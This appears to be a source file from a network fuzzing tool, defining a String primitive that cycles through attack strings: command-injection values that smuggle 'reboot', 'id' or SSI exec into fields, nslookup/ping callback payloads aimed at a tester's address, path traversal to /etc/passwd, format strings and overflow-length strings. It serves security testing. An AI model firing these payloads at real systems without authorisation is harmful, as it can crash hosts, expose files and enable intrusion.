import random
import glob
import itertools
from typing import Union, Iterable, List

from ..mutant import Mutant
from ...exception import FuzzowskiRuntimeError


class String(Mutant):
    default_mutation_types = ('instance', 'callback', 'file', 'long', 'commands', 'format', 'misc')
    # store generic mutations as a class variable to avoid copying the structure across each instantiated primitive.
    _generic_long_mutations = []  # It will be filled in _init_ if it is empty

    _generic_command_mutations = [
        "|touch /tmp/fuzzowski",
        ";touch /tmp/fuzzowski;",
        "|notepad",
        ";notepad;",
        "\nnotepad\n",
        "|reboot",
        ";reboot;",
        "\nreboot\n",

        # fuzzdb command injection
        "a)|reboot;",
        "CMD=$'reboot';$CMD",
        "a;reboot",
        "a)|reboot",
        "|reboot;",
        "'reboot'",
        "^CMD=$\"reboot\";$CMD",
        "`reboot`",
        "%0DCMD=$'reboot';$CMD",
        "/index.html|reboot|",
        "%0a reboot %0a",
        "|reboot|",
        "||reboot;",
        ";reboot/n",
        "id",
        ";id",
        "a;reboot|",
        "&reboot&",
        "%0Areboot",
        "a);reboot",
        "$;reboot",
        "&CMD=$\"reboot\";$CMD",
        "&&CMD=$\"reboot\";$CMD",
        ";reboot",
        "id;",
        ";reboot;",
        "&CMD=$'reboot';$CMD",
        "& reboot &",
        "; reboot",
        "&&CMD=$'reboot';$CMD",
        "reboot",
        "^CMD=$'reboot';$CMD",
        ";CMD=$'reboot';$CMD",
        "|reboot",
        "<reboot;",
        "FAIL||reboot",
        "a);reboot|",
        "%0DCMD=$\"reboot\";$CMD",
        "reboot|",
        "%0Areboot%0A",
        "a;reboot;",
        "CMD=$\"reboot\";$CMD",
        "&&reboot",
        "||reboot|",
        "&&reboot&&",
        "^reboot",
        ";|reboot|",
        "|CMD=$'reboot';$CMD",
        "|nid",
        "&reboot",
        "a|reboot",
        "<reboot%0A",
        "FAIL||CMD=$\"reboot\";$CMD",
        "$(reboot)",
        "<reboot%0D",
        ";reboot|",
        "id|",
        "%0Dreboot",
        "%0Areboot%0A",
        "%0Dreboot%0D",
        ";system('reboot')",
        "|CMD=$\"reboot\";$CMD",
        ";CMD=$\"reboot\";$CMD",
        "<reboot",
        "a);reboot;",
        "& reboot",
        "| reboot",
        "FAIL||CMD=$'reboot';$CMD",
        "<!--#exec cmd=\"reboot\"-->",
        "reboot;",
    ]

    _generic_format_mutations = [
        "%n" * 100,
        "%n" * 500,
        "\"%n\"" * 500,
        "%s" * 100,
        "%s" * 500,
        "\"%s\"" * 500
    ]

    _generic_misc_mutations = [
        "",
        # strings ripped from spike (and some others I added)
        "/.:/" + "A" * 5000 + "\x00\x00",
        "/.../" + "B" * 5000 + "\x00\x00",
        "/.../.../.../.../.../.../.../.../.../.../",
        "/../../../../../../../../../../../../etc/passwd",
        "/../../../../../../../../../../../../boot.ini",
        "..:..:..:..:..:..:..:..:..:..:..:..:..:",
        "\\\\*",
        "\\\\?\\",
        "/\\" * 5000,
        "/." * 5000,
        "!@#$%%^#$%#$@#$%$$@#$%^^**(()",
        "%01%02%03%04%0a%0d%0aADSF",
        "%01%02%03@%04%0a%0d%0aADSF",
        "\x01\x02\x03\x04",
        "/%00/",
        "%00/",
        "%00",
        "%u0000",
        "%\xfe\xf0%\x00\xff",
        "%\xfe\xf0%\x01\xff" * 20,

        # some binary strings.
        "\xde\xad\xbe\xef",
        "\xde\xad\xbe\xef" * 10,
        "\xde\xad\xbe\xef" * 100,
        "\xde\xad\xbe\xef" * 1000,
        "\xde\xad\xbe\xef" * 10000,

        # miscellaneous.
        "\r\n" * 100,
        "<>" * 500  # sendmail crackaddr (http://lsd-pl.net/other/sendmail.txt)
    ]

    _generic_callback_payloads = [
        '/usr/bin/env nslookup %s;',
        ' | /usr/bin/env nslookup %s;',
        '\n/usr/bin/env nslookup %s;',
        ' || /usr/bin/env nslookup %s;',
        ' && /usr/bin/env nslookup %s;',
        ';/usr/bin/env nslookup %s #',
        ' &;/usr/bin/env nslookup %s #',
        '`/usr/bin/env nslookup %s`',
        '$(/usr/bin/env nslookup %s)',

        ' | nslookup %s',
        '$ | nslookup %s',
        '&& | nslookup %s',
        '$&&nslookup %s',
        '\n nslookup %s',
        ' | nslookup %s',
        '$ | nslookup %s',
        '&& | nslookup %s',
        '$&&nslookup %s',
        '\n nslookup %s',
        ' | nslookup %s',
        '$ | nslookup %s',
        '&& | nslookup %s',
        '$&&nslookup %s',
        '\n nslookup %s',
        ' nslookup %s |',
        ' | nslookup %s |',
        ' | nslookup %s |',
        'ping -c1 %s',
        '!--#exec cmd="/usr/bin/nslookup %s"-->',
        '<!--#exec cmd="nslookup %s"-->',
        '/index.html|nslookup %s|',
        ';nslookup %s;',
        ';nslookup %s',
        ';nslookup %s;',
        '|nslookup %s',
        '|/usr/bin/nslookup %s',
        '|nslookup %s|',
        '|/usr/bin/nslookup %s|',
        '||/usr/bin/nslookup %s|',
        '|nslookup %s;',
        '||/usr/bin/nslookup %s;',
        ';nslookup %s|',
        ';|/usr/bin/nslookup %s|',
        '\n/usr/bin/nslookup %s\n',
        '\nnslookup %s\n',
        '\n/usr/bin/nslookup %s;',
        '\nnslookup %s;',
        '\n/usr/bin/nslookup %s|',
        '\nnslookup %s|',
        ';/usr/bin/nslookup %s\n',
        ';nslookup %s\n',
        '|usr/bin/nslookup %s\n',
        '|nnslookup %s\n',
        '`nslookup %s`',
        '`/usr/bin/nslookup %s`',
        'a);nslookup %s',
        'a;nslookup %s',
        'a);nslookup %s;',
        'a;nslookup %s;',
        'a);nslookup %s|',
        'a;nslookup %s|',
        'a)|nslookup %s',
        'a|nslookup %s',
        'a)|nslookup %s;',
        'a|nslookup %s',
        '|nslookup %s',
        'a);/usr/bin/nslookup %s',
        'a;/usr/bin/nslookup %s',
        'a);/usr/bin/nslookup %s;',
        'a;/usr/bin/nslookup %s;',
        'a);/usr/bin/nslookup %s|',
        'a;/usr/bin/nslookup %s|',
        'a)|/usr/bin/nslookup %s',
        'a|/usr/bin/nslookup %s',
        'a)|/usr/bin/nslookup %s;',
        'a|/usr/bin/nslookup %s',
        ";system('nslookup %s')",
        ";system('nslookup %s')",
        ";system('/usr/bin/nslookup %s')",
        '\nnslookup %s',
        '\n/usr/bin/nslookup %s',
        '\nnslookup %s',
        '\n/usr/bin/nslookup %s\n',
        '\nnslookup %s\n',
        '& ping2 -c 30 %s &',
        '& ping2 -n 30 %s &',
        '\n ping2 -i 30 %s \n',
        '`ping2 %s`',
        '| nslookup %s',
        '& nslookup %s',
        '; nslookup %s',
        '\n nslookup %s \n',
        '`nslookup %s`',
        '$;/usr/bin/nslookup %s',
        # '"|curl "http://%s/'
        '%s',
    ]

    def __init__(self, value: Union[str, bytes], name: str = None, size: int = -1, padding: Union[str, bytes] = "\x00",
                 encoding: str = "utf-8", fuzzable: bool = True, max_len: int = -1, callback_addr: str = None,
                 filename: str = None,
                 mutation_types: Iterable = default_mutation_types):
        """
        Primitive that cycles through a library of "bad" strings.
        The class variables '_generic_*_mutations' contain a list of smart fuzz values global across all instances.
        The '_instance_mutations' variable contains fuzz values specific to the instantiated primitive.
        This allows us to avoid copying the near ~70MB generic_mutations data structure across each instantiated String.

        Args:
            value:          Original string value
            name:           Primitive name
            size:           (Optional, def=-1) Static size of this field, leave -1 for dynamic.
            padding:        (Optional, def="\\x00") Value to use as padding to fill static field size.
            encoding:       (Optional, def="utf-8") String encoding, ex: utf_16_le for Microsoft Unicode.
            fuzzable:       (Optional, def=True) Enable/disable fuzzing of this primitive
            max_len:        (Optional, def=-1) Maximum string length
            callback_addr:  (Optional, def=None) Specifying a callback addr will inject ping and nslookup commands
            filename:       (Optional, def=None) Specifying a filename will replace mutations with the filename ones
            mutation_types: (Optional, def=('instance', 'callback', 'file', 'long', 'commands', 'format', 'misc'))
                            Types of mutations to use for this String:
                                instance: Specific mutations based in the default value
                                callbacks: nslookup and ping comand injection with callbacks (callback_addr must be set)
                                file: mutations obtained from file (filename must be set)
                                long: Long strings
                                command: command injection strings
                                format: format strings
                                misc: other mutations
        """

        self.size = size
        self.max_len = max_len
        if self.size > -1:
            self.max_len = self.size
        self.padding = padding
        self.encoding = encoding
        self._fuzzable = fuzzable
        self._name = name
        self._disabled = False
        self._fuzz_complete = False
        self._mutant_index = 0

        self._original_value = self._render(value)
        self._value = self._original_value

        self._mutation_types = list(mutation_types)  # Transform to a mutable list

        # Specific mutations for each instance, based in the default value
        self._instance_mutations = []  # Specific mutations of just this instance
        self._instance_mutations.extend(
            [(self._value * i)[:65535] for i in (2, 10, 100, 500, 1000, 2000, 5000, 10000, 50000)])
        self._instance_mutations.extend(
            [(self._value * i)[:65535] + b"\xfe" for i in (2, 10, 100, 500, 1000, 2000, 5000, 10000, 50000)])

        # If filename is present, only the file lines will be used for mutations
        self._filename = filename
        self._file_mutations = []
        if self._filename is not None:
            self.set_filename(self._filename)

        # If callback_addr is present, callback commands will be added to the mutations
        self._callback_mutations = []
        if callback_addr:
            self.set_callback_commands(callback_addr)

        # Set the _generic_long_mutations library if it was not filled already.
        if len(self._generic_long_mutations) == 0:
            self._add_long_strings("C")
            self._add_long_strings("1")
            self._add_long_strings("<")
            self._add_long_strings(">")
            self._add_long_strings("'")
            self._add_long_strings("\"")
            self._add_long_strings("/")
            self._add_long_strings("\\")
            self._add_long_strings("?")
            self._add_long_strings("=")
            self._add_long_strings("a=")
            self._add_long_strings("&")
            self._add_long_strings(".")
            self._add_long_strings(",")
            self._add_long_strings("(")
            self._add_long_strings(")")
            self._add_long_strings("]")
            self._add_long_strings("[")
            self._add_long_strings("%")
            self._add_long_strings("*")
            self._add_long_strings("-")
            self._add_long_strings("+")
            self._add_long_strings("{")
            self._add_long_strings("}")
            self._add_long_strings("\x14")
            self._add_long_strings("\x00")
            self._add_long_strings("\xFE")  # expands to 4 characters under utf16
            self._add_long_strings("\xFF")  # expands to 4 characters under utf16

            # add some long strings with null bytes thrown in the middle of them.
            for length in [128, 256, 1024, 2048, 4096, 32767, 0xFFFF]:
                s = "D" * length
                # Number of null bytes to insert (random)
                for i in range(random.randint(1, 10)):
                    # Location of random byte
                    loc = random.randint(1, len(s))
                    s = s[:loc] + "\x00" + s[loc:]
                self._generic_long_mutations.append(s)

        # Finally, obtain an iterable of all the mutation lists selected
        self._mutations = self.get_all_mutations()  # Contains all mutations
        self._mutation_gen = self.mutation_generator()

    def set_filename(self, filename: str, replace: bool = False):
        """
        Add mutations from the specified file library.

        Args:
            filename: File or Files paths with the file mutations
            replace: if set to True, it will set the mutation_types to just 'file'
        """
        self._filename = filename
        list_of_files = glob.glob(filename)
        if len(list_of_files) == 0:
            raise FuzzowskiRuntimeError(f'The filenames {filename} did not get any file')
        for fname in list_of_files:
            with open(fname, "r") as _file_handle:
                self._file_mutations.extend([l.strip() for l in _file_handle.readlines() if len(l) > 1])

        if replace:
            self._mutation_types = []

        # Add 'file' to mutation_types if it was not selected:
        if 'file' not in self._mutation_types:
            self._mutation_types.append('file')

        # Update mutations list
        self._mutations = self.get_all_mutations()  # Contains all mutations

    def _add_long_strings(self, sequence: str):
        """
        Given a sequence, generate a number of selectively chosen strings lengths of the given sequence and add to the
        string heuristic library.

        Args:
            sequence: String sequence to duplicate
        """
        strings = []
        for size in [128, 256, 512, 1024, 2048, 4096, 32768, 0xFFFF]:
            strings.append(sequence * (size - 2))
            strings.append(sequence * (size - 1))
            strings.append(sequence * size)
            strings.append(sequence * (size + 1))
            strings.append(sequence * (size + 2))

        for size in [5000, 10000, 20000, 99999, 100000, 500000, 1000000]:
            strings.append(sequence * size)

        for string in strings:
            self._generic_long_mutations.append(string)

    def set_callback_commands(self, callback_addr: str, replace: bool = False):
        """
        Set callback command injection mutations (nslookup and ping to a DNS name). Perfect with burp collaborator.

        Args:
            callback_addr: DNS name that will be used in nslookup and ping commands
            replace: if set to True, it will set the mutation_types to just 'callback'
        Returns:

        """
        for cmd in self._generic_callback_payloads:
            self._callback_mutations.append(str(self._original_value + bytes(cmd % callback_addr, 'utf-8'),
                                            'utf-8'))

        if replace:
            self._mutation_types = []

        # Add 'callback' to mutation_types if it was not selected:
        if 'callback' not in self._mutation_types:
            self._mutation_types.append('callback')

        # Update mutations list
        self._mutations = self.get_all_mutations()  # Contains all mutations

    def get_all_mutations(self) -> List[List]:
        """
        Returns an iterable containing all the mutation_lists. It does not copy the lists
        Returns: A "chain" of all the iterables

        """
        all_mutations = []
        if 'instance' in self._mutation_types:
            all_mutations.append(self._instance_mutations)
        if 'callback' in self._mutation_types:
            all_mutations.append(self._callback_mutations)
        if 'file' in self._mutation_types:
            all_mutations.append(self._file_mutations)
        if 'commands' in self._mutation_types:
            all_mutations.append(self._generic_command_mutations)
        if 'long' in self._mutation_types:
            all_mutations.append(self._generic_long_mutations)
        if 'format' in self._mutation_types:
            all_mutations.append(self._generic_format_mutations)
        if 'misc' in self._mutation_types:
            all_mutations.append(self._generic_misc_mutations)
        return list(itertools.chain(*all_mutations))   # This will copy the lists... :(

    def _render(self, value) -> bytes:
        """
        Render string value, properly encoded.
        """
        # pad undersized library items.
        if len(value) < self.size:
            value += self.padding * (self.size - len(value))

        try:
            if isinstance(value, bytes):
                _rendered = value
            else:
                _rendered = value.encode(self.encoding)
        except UnicodeDecodeError:
            # If we can't decode the string, just treat it like a plain byte string
            _rendered = value

        if self.max_len != -1:
            _rendered = _rendered[:self.max_len]

        return _rendered

    @property
    def mutation_types(self) -> List[str]:
        return self._mutation_types

    @mutation_types.setter
    def mutation_types(self, types_list: List[str]):
        for x in types_list:
            if x not in self.default_mutation_types:
                raise FuzzowskiRuntimeError(
                    f'String Mutation Type {x} not supported. Possible values: {self.default_mutation_types}')

        self._mutation_types = types_list
        self._mutations = self.get_all_mutations()  # Update mutations list


